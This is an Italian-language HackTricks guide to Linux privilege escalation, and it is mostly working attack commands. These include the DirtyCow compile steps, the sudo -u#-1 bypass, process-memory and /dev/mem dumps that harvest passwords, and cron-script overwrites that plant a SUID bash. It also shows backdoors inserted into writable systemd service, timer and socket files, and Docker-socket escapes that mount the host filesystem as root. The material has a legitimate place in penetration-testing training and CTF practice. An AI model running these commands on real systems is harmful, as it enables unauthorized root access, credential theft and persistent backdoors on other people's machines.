# Escalazione dei privilegi su Linux

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informazioni di Sistema

### Informazioni sul sistema operativo

Iniziamo ad acquisire conoscenze sul sistema operativo in esecuzione
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Percorso

Se **hai le autorizzazioni di scrittura su una qualsiasi cartella all'interno della variabile `PATH`** potresti essere in grado di dirottare alcune librerie o binari:
```bash
echo $PATH
```
### Informazioni sull'ambiente

Informazioni interessanti, password o chiavi API nelle variabili d'ambiente?
```bash
(env || set) 2>/dev/null
```
### Exploit del kernel

Controlla la versione del kernel e se esiste qualche exploit che può essere utilizzato per ottenere privilegi elevati
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puoi trovare un buon elenco di kernel vulnerabili e alcuni **exploit già compilati** qui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Altri siti dove puoi trovare alcuni **exploit già compilati**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Per estrarre tutte le versioni di kernel vulnerabili da quel sito web, puoi fare:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Gli strumenti che potrebbero aiutare a cercare exploit del kernel sono:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (eseguire NEL vittima, controlla solo gli exploit per il kernel 2.x)

Sempre **cercare la versione del kernel su Google**, forse la tua versione del kernel è scritta in qualche exploit del kernel e quindi sarai sicuro che questo exploit è valido.

### CVE-2016-5195 (DirtyCow)

Privilege Escalation di Linux - Kernel Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versione di Sudo

Basato sulle versioni vulnerabili di sudo che appaiono in:
```bash
searchsploit sudo
```
Puoi verificare se la versione di sudo è vulnerabile utilizzando questo comando grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Da @sickrov
```
sudo -u#-1 /bin/bash
```
### Verifica della firma Dmesg fallita

Controlla **la macchina smasher2 di HTB** per un **esempio** di come questa vulnerabilità potrebbe essere sfruttata
```bash
dmesg 2>/dev/null | grep "signature"
```
### Ulteriore enumerazione di sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerare le difese possibili

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity è una collezione di patch per il kernel Linux che include miglioramenti alla sicurezza del kernel e funzionalità avanzate di protezione.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux (Security-Enhanced Linux) è un meccanismo di controllo degli accessi obbligatorio (MAC) implementato nel kernel Linux. SElinux viene utilizzato per proteggere il sistema limitando i privilegi degli utenti e dei processi.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

Address Space Layout Randomization (ASLR) è una tecnica di protezione che mira a prevenire attacchi sfruttando la conoscenza della posizione esatta della memoria di sistema. Con ASLR abilitato, le posizioni della memoria vengono casualizzate, rendendo più difficile per un attaccante prevedere dove si trovano le diverse parti della memoria.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Fuga da Docker

Se ti trovi all'interno di un container Docker, puoi provare a evadere da esso:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Dischi

Controlla **cosa è montato e smontato**, dove e perché. Se qualcosa risulta smontato, potresti provare a montarlo e controllare informazioni private.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software utile

Enumerare i binari utili
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Inoltre, controlla se **è installato qualsiasi compilatore**. Questo è utile se hai bisogno di utilizzare qualche exploit del kernel poiché è consigliabile compilarlo nella macchina in cui lo utilizzerai (o in una simile)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerabile Installato

Controlla la **versione dei pacchetti e dei servizi installati**. Potrebbe esserci una vecchia versione di Nagios (per esempio) che potrebbe essere sfruttata per ottenere privilegi elevati...\
Si consiglia di controllare manualmente la versione del software installato più sospetto.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se hai accesso SSH alla macchina, potresti anche utilizzare **openVAS** per verificare la presenza di software obsoleto e vulnerabile installato all'interno della macchina.

{% hint style="info" %}
_Nota che questi comandi mostreranno molte informazioni che saranno per lo più inutili, pertanto è consigliabile utilizzare alcune applicazioni come OpenVAS o simili che verificheranno se una qualsiasi versione del software installato è vulnerabile a exploit conosciuti_
{% endhint %}

## Processi

Dai un'occhiata a **quali processi** vengono eseguiti e controlla se qualche processo ha **più privilegi del dovuto** (forse un tomcat eseguito da root?)
```bash
ps aux
ps -ef
top -n 1
```
Sempre controlla la presenza di [**debugger electron/cef/chromium** in esecuzione, potresti sfruttarlo per ottenere privilegi](electron-cef-chromium-debugger-abuse.md). **Linpeas** li rileva controllando il parametro `--inspect` nella riga di comando del processo.\
Inoltre **verifica i tuoi privilegi sui binari dei processi**, potresti sovrascrivere qualcun altro.

### Monitoraggio dei processi

Puoi utilizzare strumenti come [**pspy**](https://github.com/DominicBreuker/pspy) per monitorare i processi. Questo può essere molto utile per identificare processi vulnerabili eseguiti frequentemente o quando vengono soddisfatti determinati requisiti.

### Memoria dei processi

Alcuni servizi di un server salvano le **credenziali in chiaro nella memoria**.\
Normalmente avrai bisogno di **privilegi di root** per leggere la memoria dei processi che appartengono ad altri utenti, quindi questo è di solito più utile quando sei già root e vuoi scoprire ulteriori credenziali.\
Tuttavia, ricorda che **come utente normale puoi leggere la memoria dei processi di tua proprietà**.

{% hint style="warning" %}
Nota che al giorno d'oggi la maggior parte delle macchine **non consente ptrace per impostazione predefinita**, il che significa che non puoi eseguire il dump di altri processi che appartengono al tuo utente non privilegiato.

Il file _**/proc/sys/kernel/yama/ptrace\_scope**_ controlla l'accessibilità di ptrace:

* **kernel.yama.ptrace\_scope = 0**: tutti i processi possono essere debuggati, purché abbiano lo stesso uid. Questo è il modo classico di funzionamento di ptrace.
* **kernel.yama.ptrace\_scope = 1**: solo un processo padre può essere debuggato.
* **kernel.yama.ptrace\_scope = 2**: Solo l'amministratore può utilizzare ptrace, poiché richiede la capacità CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: Nessun processo può essere tracciato con ptrace. Una volta impostato, è necessario riavviare per abilitare nuovamente il tracciamento.
{% endhint %}

#### GDB

Se hai accesso alla memoria di un servizio FTP (ad esempio) potresti ottenere l'Heap e cercare al suo interno le credenziali.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Per un dato ID di processo, **maps mostra come la memoria è mappata all'interno dello spazio degli indirizzi virtuali di quel processo**; mostra anche le **autorizzazioni di ciascuna regione mappata**. Il file pseudo **mem espone la memoria dei processi stessi**. Dal file **maps sappiamo quali regioni di memoria sono leggibili** e i loro offset. Utilizziamo queste informazioni per **cercare nel file mem e scaricare tutte le regioni leggibili** in un file.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornisce accesso alla memoria **fisica** del sistema, non alla memoria virtuale. Lo spazio degli indirizzi virtuali del kernel può essere accessibile utilizzando /dev/kmem.\
Tipicamente, `/dev/mem` è leggibile solo da **root** e dal gruppo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump per Linux

ProcDump è una rielaborazione per Linux dello strumento classico ProcDump della suite di strumenti Sysinternals per Windows. Puoi trovarlo su [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Strumenti

Per scaricare la memoria di un processo potresti utilizzare:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puoi rimuovere manualmente i requisiti di root e scaricare il processo di tua proprietà
* Script A.5 da [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (è richiesto il root)

### Credenziali dalla Memoria del Processo

#### Esempio Manuale

Se scopri che il processo dell'autenticatore è in esecuzione:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puoi eseguire il dump del processo (vedi le sezioni precedenti per trovare diversi modi per eseguire il dump della memoria di un processo) e cercare le credenziali all'interno della memoria:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Lo strumento [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **ruberà le credenziali in testo normale dalla memoria** e da alcuni **file ben noti**. Richiede privilegi di root per funzionare correttamente.

| Funzionalità                                       | Nome del processo    |
| ------------------------------------------------- | -------------------- |
| Password GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Connessioni FTP attive)                   | vsftpd               |
| Apache2 (Sessioni di autenticazione di base HTTP attive) | apache2              |
| OpenSSH (Sessioni SSH attive - Uso di Sudo)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Compiti pianificati/Cron jobs

Verifica se qualche compito pianificato è vulnerabile. Forse puoi approfittare di uno script eseguito da root (vulnerabilità del wildcard? puoi modificare file che root utilizza? usare symlink? creare file specifici nella directory che root utilizza?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Percorso di Cron

Per esempio, all'interno di _/etc/crontab_ è possibile trovare il PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Nota come l'utente "user" ha privilegi di scrittura su /home/user_)

Se all'interno di questa crontab l'utente root cerca di eseguire un comando o script senza impostare il percorso. Per esempio: _\* \* \* \* root overwrite.sh_\
Quindi, è possibile ottenere una shell di root utilizzando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron utilizzando uno script con un carattere jolly (Wildcard Injection)

Se uno script viene eseguito da root e contiene un "**\***" all'interno di un comando, potresti sfruttarlo per fare cose inaspettate (come l'escalation dei privilegi). Esempio:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se il carattere jolly è preceduto da un percorso come** _**/some/path/\***_ **, non è vulnerabile (anche** _**./\***_ **non lo è).**

Leggi la seguente pagina per ulteriori trucchi di sfruttamento dei caratteri jolly:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Sovrascrittura dello script Cron e symlink

Se **puoi modificare uno script cron** eseguito da root, puoi ottenere facilmente una shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se lo script eseguito da root utilizza una **directory a cui hai pieno accesso**, potrebbe essere utile eliminare quella cartella e **creare un collegamento simbolico a un'altra cartella** che serva uno script controllato da te.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Lavori cron frequenti

Puoi monitorare i processi per cercare quelli che vengono eseguiti ogni 1, 2 o 5 minuti. Forse puoi approfittarne e ottenere privilegi elevati.

Ad esempio, per **monitorare ogni 0,1s per 1 minuto**, **ordinare per comandi meno eseguiti** ed eliminare i comandi che sono stati eseguiti di più, puoi fare:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Puoi anche utilizzare** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (questo monitorerà e elencherà ogni processo che viene avviato).

### Lavori cron invisibili

È possibile creare un cron job **inserendo un ritorno a capo dopo un commento** (senza carattere di nuova riga), e il cron job funzionerà. Esempio (nota il carattere di ritorno a capo):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servizi

### File _.service_ scrivibili

Verifica se puoi scrivere un qualsiasi file `.service`, se puoi, **potresti modificarlo** in modo che **esegua** il tuo **backdoor quando** il servizio viene **avviato**, **riavviato** o **arrestato** (potrebbe essere necessario attendere il riavvio della macchina).\
Per esempio, crea il tuo backdoor all'interno del file .service con **`ExecStart=/tmp/script.sh`**

### Binari di servizio scrivibili

Tieni presente che se hai **permessi di scrittura sui binari eseguiti dai servizi**, puoi cambiarli con backdoor in modo che quando i servizi vengono ri-eseguiti, i backdoor verranno eseguiti.

### systemd PATH - Percorsi relativi

Puoi vedere il PATH utilizzato da **systemd** con:
```bash
systemctl show-environment
```
Se trovi che puoi **scrivere** in una qualsiasi delle cartelle del percorso potresti essere in grado di **escalare i privilegi**. Devi cercare i file di configurazione dei servizi in cui vengono utilizzati **percorsi relativi** come:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Quindi, crea un **eseguibile** con lo **stesso nome del percorso relativo al binario** all'interno della cartella PATH di systemd in cui puoi scrivere e, quando al servizio viene chiesto di eseguire l'azione vulnerabile (**Start**, **Stop**, **Reload**), il tuo **backdoor verrà eseguito** (di solito gli utenti non privilegiati non possono avviare/arrestare servizi, ma controlla se puoi usare `sudo -l`).

**Per saperne di più sui servizi, consulta `man systemd.service`.**

## **Timer**

I **Timer** sono file di unità di systemd il cui nome termina con `**.timer**` che controllano i file o gli eventi `**.service**`. I **Timer** possono essere utilizzati come alternativa a cron poiché hanno il supporto integrato per eventi temporali del calendario e eventi temporali monotoni e possono essere eseguiti in modo asincrono.

Puoi elencare tutti i timer con:
```bash
systemctl list-timers --all
```
### Timers scrivibili

Se puoi modificare un timer, puoi farlo eseguire alcuni esistenti di systemd.unit (come un `.service` o un `.target`)
```bash
Unit=backdoor.service
```
Nella documentazione è possibile leggere cosa sia l'Unità:

> L'unità da attivare quando scade questo timer. L'argomento è un nome di unità, il cui suffisso non è ".timer". Se non specificato, questo valore predefinito è un servizio che ha lo stesso nome dell'unità timer, tranne che per il suffisso. (Vedi sopra.) Si consiglia che il nome dell'unità attivata e il nome dell'unità timer siano identici, tranne che per il suffisso.

Pertanto, per sfruttare questa autorizzazione, dovresti:

* Trovare qualche unità systemd (come un `.service`) che sta **eseguendo un binario scrivibile**
* Trovare qualche unità systemd che sta **eseguendo un percorso relativo** e avere **privilegi di scrittura** sul **percorso di systemd** (per impersonare quell'eseguibile)

**Per saperne di più sui timer, consulta `man systemd.timer`.**

### **Abilitazione Timer**

Per abilitare un timer è necessario disporre di privilegi di root ed eseguire:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Nota che il **timer** viene **attivato** creando un symlink su `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

I Socket a Dominio Unix (UDS) consentono la **comunicazione tra processi** su macchine diverse o sulla stessa macchina all'interno di modelli client-server. Utilizzano file di descrittore Unix standard per la comunicazione tra computer e vengono configurati tramite file `.socket`.

I Socket possono essere configurati utilizzando file `.socket`.

**Per saperne di più sui socket, consulta `man systemd.socket`.** All'interno di questo file, è possibile configurare diversi parametri interessanti:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Queste opzioni sono diverse ma un riepilogo viene utilizzato per **indicare dove verrà in ascolto** il socket (il percorso del file socket AF\_UNIX, l'indirizzo IPv4/6 e/o il numero di porta su cui ascoltare, ecc.)
* `Accept`: Accetta un argomento booleano. Se è **true**, viene generata un'**istanza di servizio per ogni connessione in ingresso** e viene passato solo il socket di connessione ad essa. Se è **false**, tutti i socket in ascolto vengono **passati all'unità di servizio avviata**, e viene generata solo un'unità di servizio per tutte le connessioni. Questo valore viene ignorato per i socket datagram e FIFO in cui un'unica unità di servizio gestisce incondizionatamente tutto il traffico in ingresso. **Il valore predefinito è false**. Per motivi di prestazioni, si consiglia di scrivere nuovi daemon solo in un modo adatto per `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Prende una o più righe di comando, che vengono **eseguite prima** o **dopo** che i **socket**/FIFO in ascolto sono **creati** e vincolati, rispettivamente. Il primo token della riga di comando deve essere un nome file assoluto, seguito dagli argomenti per il processo.
* `ExecStopPre`, `ExecStopPost`: Comandi aggiuntivi che vengono **eseguiti prima** o **dopo** che i **socket**/FIFO in ascolto sono **chiusi** e rimossi, rispettivamente.
* `Service`: Specifica il nome dell'unità **servizio** da **attivare** sul **traffico in ingresso**. Questa impostazione è consentita solo per i socket con Accept=no. Di default corrisponde al servizio che ha lo stesso nome del socket (con il suffisso sostituito). Nella maggior parte dei casi, non dovrebbe essere necessario utilizzare questa opzione.

### File .socket scrivibili

Se trovi un file `.socket` **scrivibile**, puoi **aggiungere** all'inizio della sezione `[Socket]` qualcosa del tipo: `ExecStartPre=/home/kali/sys/backdoor` e il backdoor verrà eseguito prima che il socket venga creato. Pertanto, dovrai **probabilmente aspettare il riavvio della macchina.**\
_Nota che il sistema deve utilizzare quella configurazione del file socket o il backdoor non verrà eseguito_

### Socket scrivibili

Se **identifichi un socket scrivibile** (_ora stiamo parlando di Socket Unix e non dei file di configurazione `.socket`_), allora **puoi comunicare** con quel socket e forse sfruttare una vulnerabilità.

### Elencazione dei Socket Unix
```bash
netstat -a -p --unix
```
### Connessione grezza
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Esempio di sfruttamento:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Sockets HTTP

Nota che potrebbero esserci alcuni **sockets in ascolto per le richieste HTTP** (_Non sto parlando dei file .socket ma dei file che agiscono come socket Unix_). Puoi verificarlo con:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Se il socket **risponde con una richiesta HTTP**, allora puoi **comunicare** con esso e forse **sfruttare qualche vulnerabilità**.

### Socket Docker Scrivibile

Il socket Docker, spesso trovato in `/var/run/docker.sock`, è un file critico che dovrebbe essere protetto. Per impostazione predefinita, è scrivibile dall'utente `root` e dai membri del gruppo `docker`. Possedere l'accesso in scrittura a questo socket può portare all'escalation dei privilegi. Ecco una panoramica di come ciò può essere fatto e metodi alternativi se il Docker CLI non è disponibile.

#### **Escalation dei Privilegi con Docker CLI**

Se hai accesso in scrittura al socket Docker, puoi escalare i privilegi utilizzando i seguenti comandi:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Questi comandi ti consentono di eseguire un container con accesso di livello root al file system dell'host.

#### **Utilizzo diretto dell'API Docker**

Nei casi in cui non sia disponibile la CLI di Docker, il socket di Docker può comunque essere manipolato utilizzando l'API di Docker e comandi `curl`.

1.  **Elenco delle immagini Docker:** Recupera l'elenco delle immagini disponibili.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **Creare un Container:** Invia una richiesta per creare un container che monta la directory radice del sistema host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Avvia il container appena creato:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **Collegarsi al Container:** Utilizza `socat` per stabilire una connessione al container, abilitando l'esecuzione di comandi al suo interno.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Dopo aver impostato la connessione `socat`, puoi eseguire comandi direttamente nel container con accesso di livello root al file system dell'host.

### Altri

Nota che se hai i permessi di scrittura sul socket di Docker perché sei **all'interno del gruppo `docker`** hai [**più modi per ottenere privilegi elevati**](interesting-groups-linux-pe/#docker-group). Se il [**docker API è in ascolto su una porta** potresti anche essere in grado di comprometterlo](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Controlla **altri modi per uscire da Docker o abusarne per ottenere privilegi elevati** in:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Escalation dei privilegi di Containerd (ctr)

Se scopri di poter utilizzare il comando **`ctr`** leggi la seguente pagina poiché **potresti essere in grado di abusarne per ottenere privilegi elevati**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Escalation dei privilegi di **RunC**

Se scopri di poter utilizzare il comando **`runc`** leggi la seguente pagina poiché **potresti essere in grado di abusarne per ottenere privilegi elevati**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus è un sofisticato **sistema di comunicazione inter-processi (IPC)** che consente alle applicazioni di interagire ed scambiare dati in modo efficiente. Progettato con il sistema Linux moderno in mente, offre un robusto framework per diversi tipi di comunicazione tra applicazioni.

Il sistema è versatile, supporta IPC di base che migliora lo scambio di dati tra processi, ricordando le **socket di dominio UNIX avanzate**. Inoltre, aiuta nella trasmissione di eventi o segnali, favorisce l'integrazione tra i componenti di sistema. Ad esempio, un segnale da un demone Bluetooth su una chiamata in arrivo può far sì che un lettore musicale si metta in pausa, migliorando l'esperienza dell'utente. Inoltre, D-Bus supporta un sistema di oggetti remoti, semplificando le richieste di servizio e le invocazioni di metodo tra applicazioni, razionalizzando processi tradizionalmente complessi.

D-Bus opera su un modello **consenti/nega**, gestendo le autorizzazioni dei messaggi (chiamate di metodo, emissioni di segnali, ecc.) in base all'effetto cumulativo delle regole di politica corrispondenti. Queste politiche specificano le interazioni con il bus, consentendo potenzialmente l'escalation dei privilegi attraverso lo sfruttamento di queste autorizzazioni.

Viene fornito un esempio di tale politica in `/etc/dbus-1/system.d/wpa_supplicant.conf`, che dettaglia le autorizzazioni per l'utente root di possedere, inviare e ricevere messaggi da `fi.w1.wpa_supplicant1`.

Le politiche senza un utente o gruppo specificato si applicano universalmente, mentre le politiche di contesto "default" si applicano a tutti non coperti da altre politiche specifiche.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Scopri come enumerare e sfruttare una comunicazione D-Bus qui:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Rete**

È sempre interessante enumerare la rete e capire la posizione della macchina.

### Enumerazione generica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
